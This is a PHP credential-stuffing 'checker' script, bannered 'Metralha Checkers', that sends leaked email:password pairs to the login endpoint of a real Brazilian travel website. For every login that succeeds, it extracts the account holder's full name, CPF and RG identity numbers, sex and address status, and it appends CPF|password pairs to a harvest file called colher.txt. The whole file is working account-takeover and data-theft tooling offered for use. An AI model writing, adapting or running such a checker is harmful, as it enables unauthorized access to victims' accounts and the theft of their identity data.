<?php



// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


//strtoupper — Converte uma string para maiúsculas Ex: $teste = strtoupper(getStr($resposta, '',''));
// $variavel = (int)getStr2($pay, '',''); - (int) "Puchar valores inteiros da variavel"
// html_entity_decode - Converte HTML para retorno JSON (espeficico para pages sem JSON)
// str_shuffle = Embaralha nomes na string
// substr_count — Count the number of substring occurrences
// implode  - A função implode() retorna uma string dos elementos de um array.
// stristr - Pesquisa e retorna valores tipo, 'substr'

$hoje = date("H:i:s - d/m/Y");

    
    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $email = multiexplode(array(":", "|", ""), $lista)[0];
    $senha = multiexplode(array(":", "|", ""), $lista)[1];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
}
    function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}
    function novoBypass($length = 16) {
    $characters = '66c4aacab43222d7';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$contador = strlen($lista);

if ($contador < 8){

    die(json_encode(array("Error" => "Invalido, o conteudo informado esta devidamente incorrreto.")));
    
}

$metralhagostoso = substr($lista, 0, 8);

if (($metralhagostoso == 'Aprovada') or ($metralhagostoso == 'Aprovado')!== false) {

    die(json_encode(array("Error" => "Vai se foder kkkkkkk.", "Mensagemdometralha" => "Aqui nao amador...!")));

}




$metraialinklogin = 'https://www.havanviagens.com.br/Cliente/LoginCliente';

$metraia_postfield = 'login='.$email.'&senha='.$senha.'';

$headers_metraia = array (

'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.havanviagens.com.br',
'referer: https://www.havanviagens.com.br/Cliente/Login?tipoDeConteudo=14',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
'x-requested-with: XMLHttpRequest'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $metraialinklogin);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers_metraia);
curl_setopt($ini, CURLOPT_POSTFIELDS, $metraia_postfield);
$resposta = curl_exec($ini);
//$jaison = json_decode(curl_exec($ini), true);

 $decodificar_estaporra = json_decode($resposta, true);

 $retorno = $decodificar_estaporra['Erro'];


 if (empty($retorno)!== false ) {

    $averiguar_retorno = "Falha ao obter resultados.";

 } else {

    $averiguar_retorno = ''.$retorno.'';

 }


 $infor = json_decode($resposta, true)['Cliente'];

$nome = $infor['NomeCompleto'];
$sexo = $infor['Sexo'];
$cpf = $infor['CPF'];
$rg = $infor['RG'];
$endereco_valido = $infor['LocalizacaoValida'];

$converter = str_replace(".", "", $cpf); // Colher db de senha em senha hihi


//$nome = metraiapuxar($resposta, '"NomeCompleto":"','"', 1);
//$sexo = metraiapuxar($resposta, '"Sexo":"','"', 1);
//$cpf = metraiapuxar($resposta, '"CPF":"','"', 1);
//$rg = metraiapuxar($resposta, '"RG":"','"', 1);
//$endereco_valido = metraiapuxar($resposta, '"LocalizacaoValida":',',', 1);



if ($endereco_valido = 'true') {

    $averiguar_local = "Endereco cadastrado da conta valido.";

} else if (empty($endereco_valido)!== false ){

    $averiguar_local = "Falha ao obter resultado.";

} else {


    $averiguar_local = "Endereco cadastrado, nao e valido.";

}


if (empty($rg)!== false ) {

    $averiguar_rg = "Falha ao obter resultados.";

} else {

    $averiguar_rg = ''.$rg.'';

}


if(empty($cpf)!== false ) {

    $averiguar_cpf = "Falha ao obter resultados.";

} else {

    $averiguar_cpf = ''.$cpf.'';

}


if (empty($nome)!== false ) {

    $averiguar_nome = "Falha ao obter resultados.";

} else {


    $averiguar_nome = ''.$nome.'';


}


if ($sexo = 'M') {

    $define_sexo = "Masculino";

} else if (empty($sexo)!== false) {

    $define_sexo = "Falha ao obter resultados.";

} else {


    $define_sexo = "Feminino";

}



// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//
         

if (stripos($resposta, 'Sucesso":true')) {

echo "<span class='badge badge-success'>#Aprovada</span> $email|$senha  <span class='badge badge-info'>RETORNO:</span> Autenticado. <span class='badge badge-primary'>CPF:</span> $averiguar_cpf <span class='badge badge-primary'>NOME:</span> $averiguar_nome  <span class='badge badge-primary'>RG:</span> $averiguar_rg  <span class='badge badge-primary'>LOCAL CADASTRADO:</span> $averiguar_local  <span class='badge badge-primary'>SEXO:</span> $define_sexo  <br>";

      $file = fopen("colher.txt", "a");
      fwrite($file, "$converter|$senha\n");

}else {

    echo "<span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> $averiguar_retorno <br>";

 
}
?>